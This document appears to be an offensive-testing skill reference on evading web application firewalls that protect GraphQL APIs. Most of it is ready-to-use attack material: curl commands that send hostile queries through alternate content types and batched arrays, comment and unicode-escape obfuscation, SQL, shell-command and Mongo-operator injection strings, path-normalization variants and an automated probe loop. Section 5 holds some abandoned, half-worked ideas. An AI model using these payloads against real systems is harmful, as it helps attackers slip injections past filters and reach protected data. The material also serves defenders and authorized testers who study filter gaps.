# WAF and filter bypass on GraphQL endpoints

A WAF inspecting GraphQL traffic faces a structural problem: the payload is
*one JSON string field* (`"query":"..."`), and its contents are a separate
language the WAF rarely parses. Bypasses split into transport-level,
document-level, and content-level.

---

## 1. Transport-level — change the carrier

The WAF inspects `Content-Type: application/json` bodies. Change the CT:

```bash
# form-urlencoded — body parser sees flat form fields
curl -s "$BASE/graphql" -d 'query={admin{secrets}}'

# text/plain — WAFs that gate on CT=application/json skip inspection
curl -s "$BASE/graphql" -H 'Content-Type: text/plain' \
  -d '{"query":"{admin{secrets}}"}'

# application/graphql — raw document as body
curl -s "$BASE/graphql" -H 'Content-Type: application/graphql' -d '{admin{secrets}}'

# multipart — operations inside a part
curl -s "$BASE/graphql" -F 'operations={"query":"{admin{secrets}}"}'

# GET — query in URL
curl -s "$BASE/graphql?query=%7Badmin%7Bsecrets%7D%7D"

# array batching — WAF parses element[0] only
curl -s "$BASE/graphql" -d '[{"query":"{__typename}"},{"query":"{admin{secrets}}"}]'
```

**The batching trick is the highest-value carrier bypass**: a WAF that parses
element 0 for threat patterns ignores elements 1+ — everything hostile rides
the back of a benign first element. See `batching-attacks.md` §6 for the
authz-timing sibling.

## 2. Document-level — GraphQL syntax tricks the WAF can't normalize

The WAF pattern-matches strings like `{admin`, `introspection`, `union select`.
GraphQL syntax offers mangling that stays valid:

```graphql
# comments INSIDE the document — GraphQL supports # comments
{ adm#c
in { secrets } }

# block comments don't exist; but string "#" inside names does —
# field names can't contain spaces but whitespace/commas are free-form:
{ admin { secrets , } }

# string concatenation via block strings — argument obfuscation
{ user(name: """ad' + 'min""") {id} }

# escaped unicode INSIDE strings — \uXXXX decoding happens parser-side
{ user(name: "\u0061dmin' OR 1=1--") {id} }     # "a" = \u0061

# __typename as a no-op spacer — semantics identical
{__typename admin{secrets}}

# fragment indirection — the keyword appears nowhere near the field
fragment F on Query { admin { secrets } }
{ ...F }

# alias indirection — WAF sees "x" not "admin"
{ x: admin { secrets } }

# operation name indirection
query X { admin { secrets } }
{"operationName":"X","query":"query X{...}","variables":{}}
```

**`#` comments split signatures mid-token**: `{admi#x\nn{secrets}}` parses to
`admin{secrets}` but a regex looking for `admin` fails. Per-spec, `#` to EOL
is ignored *anywhere* whitespace is legal — including inside selection sets.

**Unicode escapes in strings**: `\u0027` is `'` parser-side — a WAF pattern
on literal `'` misses `"pass\u0027 OR \u00271\u0027=\u00271"`.

## 3. Variables channel — split the payload from the query

```json
{"query":"query($n:String!){user(name:$n){id}}",
 "variables":{"n":"x' OR '1'='1 --"}}
```

The hostile string lives in `variables` — a different JSON field than `query`.
WAFs that deep-inspect `query` but treat `variables` as opaque data miss it
entirely. This is the single most reliable WAF split: **the query document
stays clean; the injection rides the variables object.**

Same trick for operations:

```json
{"query":"query Q($f:JSON){search(filter:$f){name}}",
 "variables":{"f":{"$where":"sleep(1)"}}}
```

## 4. Content-level — payload mangling that survives semantics

The *inner* injection (SQL/cmd/etc.) can be mangled inside the arg string
using the target language's own syntax — the WAF doesn't parse SQL inside
GraphQL inside JSON:

```graphql
# SQL keyword mangling inside a string arg
{ user(name:"x' uNiOn/**/sElEcT/**/1,2,3-- "){id} }
{ user(name:"x' UNunionION SELselectECT 1-- "){id} }
{ user(name:"x' /*!UNION*/ /*!SELECT*/ 1-- "){id} }

# cmdi inside arg
{ ping(host:"127.0.0.1;i\nd") }
{ ping(host:"127.0.0.1;${IFS}id") }

# Mongo operator via unicode escapes
{ user(login:{"$ne":null}) }
# JSON string: {"\u0024ne":null} — $ = \u0024 parser-side
```

## 5. HTTP-level smuggling the WAF can't see

- **Double-JSON encoding**: `{"query":"{\"query\":\"{admin}\"}"}` — no,
  that errors. But `{"query":"{\\u007badmin\\u007d"}` — no, escaped braces
  break the doc. Skip this.
- **Header splitting**: send the query via `X-GraphQL-Query` header —
  some proxies read it (Apollo serverlink). Rare; probe.
- **Chunked transfer + CRLF inside query** — WAF reassembly gaps
  (`skills/web-request-smuggling/`).
- **HTTP/2** — WAFs on HTTP/1 parsers miss h2-only frames.

## 6. Mutation-via-query field name tricks

Some WAFs block the literal `mutation{`. Alternatives that some lax servers
accept:

```graphql
# operation-type keyword is technically omittable for queries only —
# mutations REQUIRE the keyword per spec. But lax parsers…
{ m: login(u:"a",p:"b") }       # if a QUERY field named login exists — different field!
```

The real bypass: **mutations can be reached via a query-typed root** on some
servers that mis-map root types — try `{login(...)}` as a *query* field when
`mutation{login}` is blocked. And the inverse — a WAF that blocks `query` but
allows `mutation` lets you run reads as `mutation{user(id:1){email}}` if the
schema exposes read fields on the Mutation root too (rare but exists in
dual-rooted schemas).

## 7. IDE/WAF path exclusions

WAF rules sometimes exclude the GraphiQL/Playground *path prefix*. If the
endpoint shares the path (`/graphql` serves both IDE on GET and API on
POST), a WAF exclusion on `/graphql/*` covers everything. Check response
differences by path variant:

```bash
/graphql        /graphql/       /graphql?x     /./graphql
/api/../graphql /graphql;js     /graphql.json
```

Path normalization differentials — `skills/web-parser-differential/`.

## 8. The depth-limiter != defence point

A server rejecting `query{...deep...}` for "depth exceeded" did NOT block the
attack — it blocked the *shape*. The same hostile intent fits in an
alias-flat or batched shape that passes the depth check. Depth limits and
cost limits are **resource protection**, not authz — never record them as
defenses for a vuln class.

## 9. Automation

```bash
# differential probe — same hostile query under each carrier
for ct in "application/json" "text/plain" "application/x-www-form-urlencoded" \
          "application/graphql" "multipart/form-data"; do
  code=$(curl -s -o /tmp/o -w '%{http_code}' "$BASE/graphql" \
    -H "Content-Type: $ct" -d '<per-ct-payload>')
  echo "$ct → $code $(wc -c < /tmp/o)"
done
```

Divergent statuses by carrier = WAF in path. Record which carriers work —
they are reusable for every downstream injection.
